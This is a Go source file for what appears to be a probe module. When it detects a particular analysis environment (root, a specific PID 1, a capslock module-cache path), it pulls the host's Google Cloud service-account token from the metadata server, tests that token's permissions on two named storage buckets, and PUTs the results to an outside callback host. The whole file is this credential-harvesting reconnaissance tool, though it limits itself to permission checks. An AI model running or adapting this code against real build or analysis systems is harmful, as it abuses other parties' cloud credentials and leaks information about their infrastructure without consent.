package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"
	"unicode/utf8"
)

var genericResultURL string
var compilerResultURL string
var sessionNonce string
var probeUserAgent string

const (
	protocolVersion   = 1
	moduleName        = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion      = "v0.0.59-codex"
	expectedUserAgent = "go-cgo-pkgsite-probe-v059-codex"

	metadataTokenURL = "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
	storageAPIHost   = "storage.googleapis.com"
	storageAPIOrigin = "https://" + storageAPIHost
	expectedPID1     = "talisman-worker-capabilities"

	requestTimeout = 20 * time.Second
	resultTimeout  = 30 * time.Second
	maximumBody    = 32 * 1024
	maximumResult  = 64 * 1024
)

var fixedBuckets = [...]string{
	"sos-byteman-downloads-oregon",
	"sos-byteman-temp-oregon",
}

var fixedPermissions = [...]string{
	"storage.objects.get",
	"storage.objects.create",
	"storage.objects.delete",
	"storage.objects.list",
	"storage.buckets.get",
	"storage.buckets.update",
}

type commandResult struct {
	Version         int    `json:"version"`
	Session         string `json:"session"`
	ID              string `json:"id"`
	CWD             string `json:"cwd"`
	ExitCode        int    `json:"exit_code"`
	TimedOut        bool   `json:"timed_out"`
	DurationMS      int64  `json:"duration_ms"`
	Stdout          string `json:"stdout"`
	Stderr          string `json:"stderr"`
	StdoutTruncated bool   `json:"stdout_truncated"`
	StderrTruncated bool   `json:"stderr_truncated"`
}

type bucketPermissionResult struct {
	Bucket     string   `json:"bucket"`
	HTTPStatus int      `json:"http_status,omitempty"`
	APIStatus  string   `json:"api_status,omitempty"`
	Granted    []string `json:"granted_permissions,omitempty"`
	Error      string   `json:"error,omitempty"`
}

type iamReport struct {
	Schema                      string                   `json:"schema"`
	Module                      string                   `json:"module"`
	Version                     string                   `json:"version"`
	Lane                        string                   `json:"lane"`
	StartedUTC                  string                   `json:"started_utc"`
	FinishedUTC                 string                   `json:"finished_utc"`
	MetadataTokenAcquired       bool                     `json:"metadata_token_acquired"`
	BucketPermissions           []bucketPermissionResult `json:"bucket_permissions,omitempty"`
	ObjectDataRequestsAttempted bool                     `json:"object_data_requests_attempted"`
	MutatingRequestsAttempted   bool                     `json:"mutating_requests_attempted"`
	Reason                      string                   `json:"reason"`
}

type metadataTokenResponse struct {
	AccessToken string `json:"access_token"`
	ExpiresIn   int64  `json:"expires_in"`
	TokenType   string `json:"token_type"`
}

type testPermissionsResponse struct {
	Permissions []string `json:"permissions"`
	Error       *struct {
		Status string `json:"status"`
	} `json:"error"`
}

func main() {
	if validateCallbackConfiguration() != nil ||
		len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	started := time.Now()
	cwd := initialWorkingDirectory()
	lane := classifyLane(cwd)
	report := iamReport{
		Schema:     "fixed-gcs-test-iam-permissions/v1",
		Module:     moduleName,
		Version:    probeVersion,
		Lane:       lane,
		StartedUTC: started.UTC().Format(time.RFC3339Nano),
		Reason:     "IAM diagnostic is fixed to the verified capslock lane",
	}
	endpoint := genericResultURL
	resultID := "v059-codex-" + lane
	if lane == "capslock" {
		endpoint = compilerResultURL
		resultID = "v059-codex-capslock-fixed-gcs-iam"
		runFixedIAMDiagnostic(&report)
	}
	report.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	_ = submitIAMReport(endpoint, resultID, cwd, started, report)
}

func runFixedIAMDiagnostic(report *iamReport) {
	metadataClient := fixedHTTPClient()
	token, err := fetchMetadataToken(metadataClient)
	metadataClient.CloseIdleConnections()
	if err != nil {
		report.Reason = err.Error()
		return
	}
	report.MetadataTokenAcquired = true
	storageClient := fixedHTTPClient()
	for _, bucket := range fixedBuckets {
		report.BucketPermissions = append(report.BucketPermissions, testBucketPermissions(storageClient, token, bucket))
	}
	storageClient.CloseIdleConnections()
	token = ""
	report.Reason = "fixed Google Cloud Storage testIamPermissions checks completed"
}

func fixedHTTPClient() *http.Client {
	return &http.Client{
		Transport: &http.Transport{
			Proxy:           nil,
			TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12},
		},
		CheckRedirect: func(_ *http.Request, _ []*http.Request) error {
			return http.ErrUseLastResponse
		},
		Timeout: requestTimeout,
	}
}

func fetchMetadataToken(client *http.Client) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, metadataTokenURL, nil)
	if err != nil {
		return "", errors.New("metadata token request could not be created")
	}
	request.Header.Set("Metadata-Flavor", "Google")
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := client.Do(request)
	if err != nil {
		return "", errors.New("metadata token request failed")
	}
	defer response.Body.Close()
	if response.StatusCode != http.StatusOK || response.Header.Get("Metadata-Flavor") != "Google" {
		_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
		return "", errors.New("metadata token endpoint rejected the fixed request")
	}
	if !isJSONContentType(response.Header.Get("Content-Type")) {
		return "", errors.New("metadata token response was invalid")
	}
	body, err := readBoundedBody(response.Body)
	if err != nil {
		return "", errors.New("metadata token response was invalid")
	}
	var token metadataTokenResponse
	if !decodeOneJSON(body, &token) || !validAccessToken(token.AccessToken) ||
		!strings.EqualFold(token.TokenType, "Bearer") || token.ExpiresIn <= 0 {
		return "", errors.New("metadata token response was invalid")
	}
	return token.AccessToken, nil
}

func testBucketPermissions(client *http.Client, token, bucket string) bucketPermissionResult {
	result := bucketPermissionResult{Bucket: bucket}
	endpoint, err := fixedTestPermissionsURL(bucket)
	if err != nil {
		result.Error = "bucket target was outside the fixed allowlist"
		return result
	}
	if !validAccessToken(token) {
		result.Error = "metadata token was invalid"
		return result
	}
	ctx, cancel := context.WithTimeout(context.Background(), requestTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		result.Error = "testIamPermissions request could not be created"
		return result
	}
	request.Header.Set("Authorization", "Bearer "+token)
	request.Header.Set("User-Agent", probeUserAgent)
	response, err := client.Do(request)
	if err != nil {
		result.Error = "testIamPermissions request failed"
		return result
	}
	defer response.Body.Close()
	result.HTTPStatus = response.StatusCode
	body, err := readBoundedBody(response.Body)
	if err != nil {
		result.Error = "testIamPermissions response exceeded its bound"
		return result
	}
	var decoded testPermissionsResponse
	if !isJSONContentType(response.Header.Get("Content-Type")) || !decodeOneJSON(body, &decoded) {
		result.Error = "testIamPermissions response was not one JSON value"
		return result
	}
	if decoded.Error != nil {
		result.APIStatus = boundedAPIStatus(decoded.Error.Status)
		if decoded.Error.Status != "" && result.APIStatus == "" {
			result.Error = "testIamPermissions response had an invalid API status"
			return result
		}
	}
	granted, ok := validatedGrantedPermissions(decoded.Permissions)
	if !ok {
		result.Error = "testIamPermissions returned an unexpected permission"
		return result
	}
	result.Granted = granted
	return result
}

func fixedTestPermissionsURL(bucket string) (string, error) {
	if !allowedBucket(bucket) {
		return "", errors.New("bucket was not allowed")
	}
	values := url.Values{}
	for _, permission := range fixedPermissions {
		values.Add("permissions", permission)
	}
	return storageAPIOrigin + "/storage/v1/b/" + url.PathEscape(bucket) + "/iam/testPermissions?" + values.Encode(), nil
}

func allowedBucket(candidate string) bool {
	for _, bucket := range fixedBuckets {
		if candidate == bucket {
			return true
		}
	}
	return false
}

func validatedGrantedPermissions(values []string) ([]string, bool) {
	allowed := make(map[string]struct{}, len(fixedPermissions))
	for _, permission := range fixedPermissions {
		allowed[permission] = struct{}{}
	}
	seen := make(map[string]struct{}, len(values))
	result := make([]string, 0, len(values))
	for _, permission := range values {
		if _, ok := allowed[permission]; !ok {
			return nil, false
		}
		if _, duplicate := seen[permission]; duplicate {
			return nil, false
		}
		seen[permission] = struct{}{}
		result = append(result, permission)
	}
	sort.Strings(result)
	return result, true
}

func boundedAPIStatus(value string) string {
	if value == "" || len(value) > 64 {
		return ""
	}
	for _, character := range value {
		if (character < 'A' || character > 'Z') && character != '_' {
			return ""
		}
	}
	return value
}

func validAccessToken(value string) bool {
	if len(value) < 1 || len(value) > 16*1024 || !utf8.ValidString(value) {
		return false
	}
	for _, character := range value {
		if character < 0x21 || character > 0x7e {
			return false
		}
	}
	return true
}

func isJSONContentType(value string) bool {
	mediaType := strings.TrimSpace(strings.Split(value, ";")[0])
	return strings.EqualFold(mediaType, "application/json")
}

func readBoundedBody(reader io.Reader) ([]byte, error) {
	body, err := io.ReadAll(io.LimitReader(reader, maximumBody+1))
	if err != nil || len(body) > maximumBody {
		return nil, errors.New("response body exceeded its bound")
	}
	return body, nil
}

func decodeOneJSON(data []byte, target any) bool {
	decoder := json.NewDecoder(bytes.NewReader(data))
	if decoder.Decode(target) != nil {
		return false
	}
	var trailing any
	return decoder.Decode(&trailing) == io.EOF
}

func validSessionNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func exactCallbackURL(raw, expectedPath string) (*url.URL, error) {
	parsed, err := url.Parse(raw)
	if err != nil || parsed.Scheme != "https" || parsed.Host == "" || parsed.Hostname() == "" ||
		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" ||
		parsed.ForceQuery || parsed.Fragment != "" || parsed.Path != expectedPath {
		return nil, errors.New("callback URL was outside its exact fixed HTTPS shape")
	}
	return parsed, nil
}

func validateCallbackConfiguration() error {
	if !validSessionNonce(sessionNonce) || probeUserAgent != expectedUserAgent {
		return errors.New("callback identity was invalid")
	}
	generic, err := exactCallbackURL(genericResultURL, "/v1/result/"+sessionNonce+"/generic")
	if err != nil {
		return err
	}
	compiler, err := exactCallbackURL(compilerResultURL, "/v1/result/"+sessionNonce+"/compiler")
	if err != nil || generic.Scheme != compiler.Scheme || generic.Host != compiler.Host {
		return errors.New("callback endpoints did not share one exact HTTPS origin")
	}
	return nil
}

func initialWorkingDirectory() string {
	if filepath.IsAbs(os.Args[3]) {
		candidate := filepath.Clean(os.Args[3])
		if info, err := os.Stat(candidate); err == nil && info.IsDir() {
			return candidate
		}
	}
	directory, err := os.Getwd()
	if err != nil || !filepath.IsAbs(directory) {
		return "/"
	}
	return filepath.Clean(directory)
}

func classifyLane(cwd string) string {
	return classifyLaneWithIdentity(cwd, os.Geteuid(), readSmallFile("/proc/1/cmdline", 8192))
}

func classifyLaneWithIdentity(cwd string, effectiveUID int, pid1 string) string {
	capslock := "/capslock/modcache/" + moduleName + "@" + probeVersion
	if effectiveUID == 0 && strings.Contains(pid1, expectedPID1) &&
		(cwd == capslock || strings.HasPrefix(cwd, capslock+"/")) {
		return "capslock"
	}
	generic := "/pkg/mod/" + moduleName + "@" + probeVersion
	if strings.Contains(cwd, generic) {
		return "generic"
	}
	return "unknown"
}

func readSmallFile(path string, maximum int64) string {
	file, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return ""
	}
	return string(value)
}

func submitIAMReport(endpoint, id, cwd string, started time.Time, report iamReport) error {
	encoded, err := json.MarshalIndent(report, "", "  ")
	result := commandResult{
		Version: protocolVersion, Session: sessionNonce, ID: id, CWD: cwd,
		DurationMS: time.Since(started).Milliseconds(),
	}
	if err != nil {
		result.ExitCode = 125
		result.Stderr = "IAM report could not be encoded"
	} else {
		result.Stdout = string(encoded)
	}
	return submitResult(endpoint, result)
}

func submitResult(endpoint string, result commandResult) error {
	encoded, err := json.Marshal(result)
	if err != nil || len(encoded) > maximumResult {
		return errors.New("result exceeded its bound")
	}
	ctx, cancel := context.WithTimeout(context.Background(), resultTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, endpoint, bytes.NewReader(encoded))
	if err != nil {
		return err
	}
	request.Header.Set("User-Agent", probeUserAgent)
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("X-Codex-Probe-Session", sessionNonce)
	client := fixedHTTPClient()
	client.Timeout = resultTimeout
	response, err := client.Do(request)
	if err != nil {
		return err
	}
	defer response.Body.Close()
	_, _ = io.Copy(io.Discard, io.LimitReader(response.Body, 4096))
	if response.StatusCode < 200 || response.StatusCode >= 300 {
		return fmt.Errorf("result rejected with HTTP %d", response.StatusCode)
	}
	return nil
}
